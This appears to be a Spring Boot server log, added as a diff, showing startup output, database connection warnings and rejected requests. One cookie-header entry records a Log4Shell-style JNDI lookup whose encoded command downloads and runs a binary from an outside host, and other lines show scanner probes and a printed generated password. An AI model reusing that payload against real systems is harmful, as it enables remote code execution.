@@ -1,0 +1,1079 @@
+
+  .   ____          _            __ _ _
+ /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
+( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
+ \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
+  '  |____| .__|_| |_|_| |_\__, | / / / /
+ =========|_|==============|___/=/_/_/_/
+ :: Spring Boot ::       (v2.3.10.RELEASE)
+
+2022-01-25 19:14:37.547  INFO 8250 --- [           main] com.example.app.AppApplication           : Starting AppApplication v0.0.1-SNAPSHOT on hecs-szz with PID 8250 (/root/App/App.jar started by root in /root/App)
+2022-01-25 19:14:37.554  INFO 8250 --- [           main] com.example.app.AppApplication           : No active profile set, falling back to default profiles: default
+2022-01-25 19:14:39.327  INFO 8250 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Multiple Spring Data modules found, entering strict repository configuration mode!
+2022-01-25 19:14:39.330  INFO 8250 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data Redis repositories in DEFAULT mode.
+2022-01-25 19:14:39.380  INFO 8250 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 15ms. Found 0 Redis repository interfaces.
+2022-01-25 19:14:41.063  INFO 8250 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8081 (http)
+2022-01-25 19:14:41.083  INFO 8250 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2022-01-25 19:14:41.084  INFO 8250 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.45]
+2022-01-25 19:14:41.196  INFO 8250 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
+2022-01-25 19:14:41.196  INFO 8250 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 3513 ms
+2022-01-25 19:14:43.438  INFO 8250 --- [           main] .s.s.UserDetailsServiceAutoConfiguration : 
+
+Using generated security password: d1bd7482-8d9d-4685-bf2a-646af92bcf67
+
+2022-01-25 19:14:43.645  INFO 8250 --- [           main] o.s.s.web.DefaultSecurityFilterChain     : Creating filter chain: any request, [org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@798162bc, org.springframework.security.web.context.SecurityContextPersistenceFilter@7dfb0c0f, org.springframework.security.web.header.HeaderWriterFilter@2584b82d, org.springframework.security.web.authentication.logout.LogoutFilter@6cd24612, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@169bb4dd, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@d23e042, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@1df8da7a, org.springframework.security.web.session.SessionManagementFilter@6933b6c6, org.springframework.security.web.access.ExceptionTranslationFilter@6a4f1a55, org.springframework.security.web.access.intercept.FilterSecurityInterceptor@37313c65]
+2022-01-25 19:14:43.921  INFO 8250 --- [           main] o.s.s.concurrent.ThreadPoolTaskExecutor  : Initializing ExecutorService 'applicationTaskExecutor'
+2022-01-25 19:14:44.247  WARN 8250 --- [           main] ion$DefaultTemplateResolverConfiguration : Cannot find template location: classpath:/templates/ (please add some templates or check your Thymeleaf configuration)
+2022-01-25 19:14:44.713  INFO 8250 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8081 (http) with context path ''
+2022-01-25 19:14:44.746  INFO 8250 --- [           main] com.example.app.AppApplication           : Started AppApplication in 8.115 seconds (JVM running for 9.039)
+2022-01-25 19:19:17.234  INFO 8250 --- [nio-8081-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
+2022-01-25 19:19:17.235  INFO 8250 --- [nio-8081-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
+2022-01-25 19:19:17.261  INFO 8250 --- [nio-8081-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 26 ms
+2022-01-25 19:19:17.423  INFO 8250 --- [nio-8081-exec-1] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...
+2022-01-25 19:19:17.977  INFO 8250 --- [nio-8081-exec-1] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.
+2022-01-25 22:05:47.843  INFO 8250 --- [nio-8081-exec-8] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x00u0x010x000x00q0x030x030xef0xcdMF\Am0xaa/d0xb50xe50x170x03U0x0c|0x1dd0xf10xc30x9a<0xe0D0x830x1e0xccB0x14&0xdc0x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00.0x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x01...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-01-26 16:02:21.096  WARN 8250 --- [nio-8081-exec-9] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@13c90fe4 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 16:02:21.103  WARN 8250 --- [nio-8081-exec-9] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@420e1474 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 16:02:21.107  WARN 8250 --- [nio-8081-exec-9] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@1ac80ac3 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 16:02:21.116  WARN 8250 --- [nio-8081-exec-9] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@41258051 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 16:02:21.123  WARN 8250 --- [nio-8081-exec-9] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@74df2d88 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 16:02:21.128  WARN 8250 --- [nio-8081-exec-9] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@46402ad3 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 16:02:21.133  WARN 8250 --- [nio-8081-exec-9] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@1c04beca (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 16:02:21.138  WARN 8250 --- [nio-8081-exec-9] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@71ce9213 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 16:02:21.144  WARN 8250 --- [nio-8081-exec-9] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@7c7052cf (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 16:02:21.150  WARN 8250 --- [nio-8081-exec-9] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@3ba1e920 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 18:00:05.300  WARN 8250 --- [nio-8081-exec-6] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@1f7a6048 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 18:00:05.308  WARN 8250 --- [nio-8081-exec-6] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@5e476a73 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 18:00:05.313  WARN 8250 --- [nio-8081-exec-6] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@23e74840 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 18:00:05.320  WARN 8250 --- [nio-8081-exec-6] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@6f531454 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 18:00:05.325  WARN 8250 --- [nio-8081-exec-6] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@5b1968de (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 18:00:05.332  WARN 8250 --- [nio-8081-exec-6] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@27d46ff9 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 18:00:05.338  WARN 8250 --- [nio-8081-exec-6] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@50523ee3 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 18:00:05.343  WARN 8250 --- [nio-8081-exec-6] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@401de3af (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-26 18:00:05.349  WARN 8250 --- [nio-8081-exec-6] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@3a264fe5 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-27 07:43:34.699  INFO 8250 --- [nio-8081-exec-9] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xee0x010x000x000xea0x030x03I0x060xb20xf90xbc0x99i0xc0Y0xfb0xf80xbae-0x83Ud]0x0e0x8d0xb7b80xb4g0xc60xdd9dZ8f]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-01-27 14:34:17.322  INFO 8250 --- [nio-8081-exec-5] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xee0x010x000x000xea0x030x030xb5|0xbf)sK0x8dO0xfbN.Vyu4]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-01-27 19:36:53.683  WARN 8250 --- [nio-8081-exec-7] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@7e4b627e (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-27 19:36:53.691  WARN 8250 --- [nio-8081-exec-7] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@3bf9ad62 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-27 19:36:53.697  WARN 8250 --- [nio-8081-exec-7] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@3fbf7ee6 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-27 19:36:53.704  WARN 8250 --- [nio-8081-exec-7] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@1ac2b3fd (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-27 19:36:53.710  WARN 8250 --- [nio-8081-exec-7] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@759708f0 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-27 19:36:53.715  WARN 8250 --- [nio-8081-exec-7] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@3f3399d (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-28 08:18:55.743  INFO 8250 --- [nio-8081-exec-2] o.apache.tomcat.util.http.parser.Cookie  : A cookie header was received [('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L3NzaGRfcHR5OyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvc3NoZF9wdHk7IGNobW9kIDc3NyBzc2hkX3B0eTsgLi9zc2hkX3B0eSBleHBsb2l0}')] that contained an invalid cookie. That cookie will be ignored.
+ Note: further occurrences of this error will be logged at DEBUG level.
+2022-01-28 15:38:52.371  INFO 8250 --- [nio-8081-exec-9] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [2380x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-01-29 13:45:09.496  INFO 8250 --- [nio-8081-exec-2] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x050x01...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-01-29 18:36:43.359  WARN 8250 --- [nio-8081-exec-8] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@3c23209c (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-30 10:44:05.510  WARN 8250 --- [nio-8081-exec-3] com.zaxxer.hikari.pool.PoolBase          : HikariPool-1 - Failed to validate connection com.mysql.cj.jdbc.ConnectionImpl@67ba28d2 (No operations allowed after connection closed.). Possibly consider using a shorter maxLifetime value.
+2022-01-30 14:45:19.408  INFO 8250 --- [io-8081-exec-10] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+
+java.lang.IllegalArgumentException: Invalid character found in method name [0x030x000x00/*0xe00x000x000x000x000x00Cookie:]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:417) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:261) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-01-31 08:16:17.073 ERROR 8250 --- [nio-8081-exec-1] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception
+
+org.springframework.security.web.firewall.RequestRejectedException: The request was rejected because the URL contained a potentially malicious String "%2e"
+	at org.springframework.security.web.firewall.StrictHttpFirewall.rejectedBlacklistedUrls(StrictHttpFirewall.java:369) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.firewall.StrictHttpFirewall.getFirewalledRequest(StrictHttpFirewall.java:336) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:194) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) ~[tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) [tomcat-embed-core-9.0.45.jar!/:na]
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_311]
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_311]
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) [tomcat-embed-core-9.0.45.jar!/:na]
+	at java.lang.Thread.run(Thread.java:748) [na:1.8.0_311]
+
+2022-01-31 11:22:19.418 ERROR 8250 --- [nio-8081-exec-1] o.a.c.c.C.[.[.[/].[dispatcherServlet]    : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception
+
+org.springframework.security.web.firewall.RequestRejectedException: The request was rejected because the URL contained a potentially malicious String "%2e"
+	at org.springframework.security.web.firewall.StrictHttpFirewall.rejectedBlacklistedUrls(StrictHttpFirewall.java:369) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.firewall.StrictHttpFirewall.getFirewalledRequest(StrictHttpFirewall.java:336) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:194) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) ~[spring-security-web-5.3.9.RELEASE.jar!/:5.3.9.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
+	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) ~[spring-web-5.2.14.RELEASE.jar!/:5.2.14.RELEASE]
